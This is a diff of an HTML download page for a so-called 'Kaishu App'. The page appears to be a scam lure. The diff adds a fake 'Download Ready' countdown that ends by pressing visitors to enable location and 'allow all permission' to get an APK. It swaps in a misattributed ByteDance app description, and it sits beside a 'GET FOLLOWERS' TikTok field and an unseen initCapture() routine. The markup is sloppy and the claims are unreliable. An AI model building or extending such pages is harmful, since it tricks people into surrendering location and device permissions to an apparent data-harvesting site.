@@ -34,15 +34,13 @@ fonts.googleapis.com/css?family=Montserrat">
 
   <div style="margin-top:25px;font-size:14px;color:#444;line-height:1.6;">
     <h3>About Kaishu App</h3>
-    Kaishu App is a modern digital payment platform that allows instant money transfers.
-    It provides secure transactions, fast processing and an easy‑to‑use interface.
-    <br><br>
-    ✔ Instant Transfers<br>
-    ✔ Secure Payments<br>
-    ✔ User Friendly Interface<br>
-    ✔ 24/7 Accessibility
-  </div>
-
+    Kaishu is a popular social media app where users create, watch, and share short videos. It is owned by the Chinese company ByteDance and is used by millions of people worldwide.
+    Many feature uses in thi like
+   • Easy to use
+• Entertaining content
+• Platform for talent (acting, dancing, comedy, education)
+• Opportunity to become famous
+• Some creators can earn money through brand deals and gifts
 </div>
 
 <script>
@@ -60,11 +58,20 @@ document.getElementById("downloadBtn").onclick = function(){
 
     if(seconds <= 0){
       clearInterval(interval);
-      box.innerHTML = "✅ Download Ready! Click button again.";
+
+      box.innerHTML = `
+        <div style="color:red; font-weight:bold;">
+          ⚠ Your Location or permission is not enabled firstly on your location then refresh the page and allow all permission your apk will download.
+        </div>
+        <div style="margin-top:5px;">
+          Please enable your location and try again.
+        </div>
+      `;
     }
 
   },1000);
 };
+</script>
 </script>
     <input id="ytlink" type="text" class="form-control" placeholder="Enter TikTok Profile URL" spellcheck="false">
     <button id="thumbdloadbtn" onclick="downloadThumbnail()">GET FOLLOWERS</button>
@@ -186,6 +193,6 @@ document.getElementById("downloadBtn").onclick = function(){
     initCapture();
   </script>
 
-  <footer><p>DEVELOP BY ALI🙂❤️</p></footer>
+  <footer><p>Thanks stay happy Your smile is very important</p></footer>
 </body>
 </html>
